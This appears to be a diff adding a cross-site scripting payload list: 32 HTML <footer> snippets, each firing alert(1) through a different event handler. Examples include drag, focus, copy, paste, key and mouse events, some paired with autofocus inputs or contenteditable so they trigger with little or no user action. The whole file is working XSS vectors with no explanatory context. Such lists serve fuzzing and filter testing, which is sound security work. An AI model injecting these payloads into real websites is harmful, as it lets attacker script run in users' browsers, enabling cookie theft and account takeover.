@@ -1,0 +1,32 @@
+<footer draggable="true" ondrag="alert(1)">test</footer>
+<footer draggable="true" ondragend="alert(1)">test</footer>
+<footer draggable="true" ondragenter="alert(1)">test</footer>
+<footer draggable="true" ondragleave="alert(1)">test</footer>
+<footer draggable="true" ondragstart="alert(1)">test</footer>
+<footer id=x tabindex=1 onactivate=alert(1)></footer>
+<footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>
+<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>
+<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>
+<footer id=x tabindex=1 onfocus=alert(1)></footer>
+<footer id=x tabindex=1 onfocusin=alert(1)></footer>
+<footer onbeforecopy="alert(1)" contenteditable>test</footer>
+<footer onbeforecut="alert(1)" contenteditable>test</footer>
+<footer onbeforepaste="alert(1)" contenteditable>test</footer>
+<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>
+<footer onclick="alert(1)">test</footer>
+<footer oncontextmenu="alert(1)">test</footer>
+<footer oncopy="alert(1)" contenteditable>test</footer>
+<footer oncut="alert(1)" contenteditable>test</footer>
+<footer ondblclick="alert(1)">test</footer>
+<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>
+<footer onkeydown="alert(1)" contenteditable>test</footer>
+<footer onkeypress="alert(1)" contenteditable>test</footer>
+<footer onkeyup="alert(1)" contenteditable>test</footer>
+<footer onmousedown="alert(1)">test</footer>
+<footer onmouseenter="alert(1)">test</footer>
+<footer onmouseleave="alert(1)">test</footer>
+<footer onmousemove="alert(1)">test</footer>
+<footer onmouseout="alert(1)">test</footer>
+<footer onmouseover="alert(1)">test</footer>
+<footer onmouseup="alert(1)">test</footer>
+<footer onpaste="alert(1)" contenteditable>test</footer>
